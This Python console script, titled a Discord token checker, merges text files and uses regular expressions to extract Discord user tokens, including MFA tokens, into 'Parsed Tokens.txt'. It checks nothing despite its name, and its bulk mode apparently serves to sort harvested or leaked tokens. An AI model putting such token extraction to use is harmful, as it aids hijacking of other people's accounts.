import colorama, os, ctypes, re, glob
from colorama import Fore
from sys import exit

def cls():
    os.system('cls' if os.name=='nt' else 'clear')

def fexit():
    input(f"\n{Fore.RESET}Press Enter button for exit")
    exit()

os.system("cls")
if __name__ == "__main__":
    os.system("cls")
    ctypes.windll.kernel32.SetConsoleTitleW("Discord Token Checker by GuFFy_OwO")
    colorama.init()

print(f"{Fore.RESET}[{Fore.CYAN}1{Fore.RESET}] Check one file")
print(f"{Fore.RESET}[{Fore.CYAN}2{Fore.RESET}] Check many files")
print()

checktype = input(f"{Fore.CYAN}>{Fore.RESET} Select An Option{Fore.CYAN}:{Fore.RESET} ")
if "1" in checktype:
    cls()
    tokenFileName = input(f"{Fore.CYAN}>{Fore.RESET}Enter the name of the file in wich are the unparsed tokens{Fore.CYAN}:{Fore.RESET} ")
elif "2" in checktype:
    cls()
    tokenDirectoryName = input(f"{Fore.CYAN}>{Fore.RESET}Enter the directory of the files in wich are the unparsed tokens{Fore.CYAN}:{Fore.RESET} ")
    if not os.path.exists(tokenDirectoryName):
        print(tokenDirectoryName + " directory not exist.")
        fexit()

else:
    print("Invalid Option.")
    fexit()

deleteDuplicates = input(f"{Fore.CYAN}>{Fore.RESET}Delete duplicates tokens? [Y/N]{Fore.CYAN}:{Fore.RESET} ")
cls()
if "2" in checktype:
    try:
        os.remove(f"{tokenDirectoryName}\\all_data.tmp")
    except: None
    open(f"{tokenDirectoryName}\\all_data.tmp", "a+")
    print(f"Glue the files...\n")

    files = glob.glob(f"{tokenDirectoryName}\\*.txt")
    with open(f"{tokenDirectoryName}\\all_data.tmp", 'w', encoding="utf-8") as result:
        for file_ in files:
            for line in open( file_, 'r', encoding="utf-8"):
                result.write(line)
    tokenFileName = f"{tokenDirectoryName}\\all_data.tmp"

if not os.path.exists(tokenFileName):
    print(tokenFileName + " not exist.")
    fexit()

def main():
    print(f"Parse tokens...")
    try:
        os.remove("Parsed Tokens.txt")
    except: None
    open("Parsed Tokens.txt", "a+")
    tokens = []
    for line in [x.strip() for x in open(f"{tokenFileName}", errors="ignore").readlines() if x.strip()]:
        for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
            for token in re.findall(regex, line):
                tokens.append(token)
    if deleteDuplicates.lower() == "y":
        tokens = list(dict.fromkeys(tokens))
    tokens_str = "\n".join(tokens)
    with open("Parsed Tokens.txt", "a", encoding="utf-8") as f:
        f.write(tokens_str)
    found = sum(1 for line in open("Parsed Tokens.txt", "r", encoding="utf-8")) 
    print(f"\nDone. Found {Fore.CYAN}{found}{Fore.RESET} tokens!")
    try:
        os.remove(f"{tokenDirectoryName}\\all_data.tmp")
    except: None
    fexit()
      
main()
